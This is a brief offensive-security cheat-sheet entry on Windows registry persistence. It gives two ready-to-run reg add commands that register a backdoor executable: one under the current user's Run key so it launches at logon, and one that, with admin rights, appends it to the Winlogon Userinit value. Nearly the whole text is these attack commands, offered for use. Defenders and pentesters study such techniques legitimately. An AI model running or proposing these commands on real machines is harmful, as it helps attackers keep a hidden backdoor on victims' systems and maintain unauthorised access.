# Registry Persistence

Providing the current working user has permission to create registry keys under 

    'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run' . 
    
A backdoor executable / script can be created to run on user logon.

The example below assumes a Backdoor executable is currently stored in 

    "C:\Users\%username%\AppData\Roaming\"

### 1) Cmd

    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\%username%\AppData\Roaming\backdoor.exe"

If we have Admin/SYSTEM permissions, we can plant a backdoor here:

    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Users\Administrator\AppData\Roaming\backdoor.exe" /f

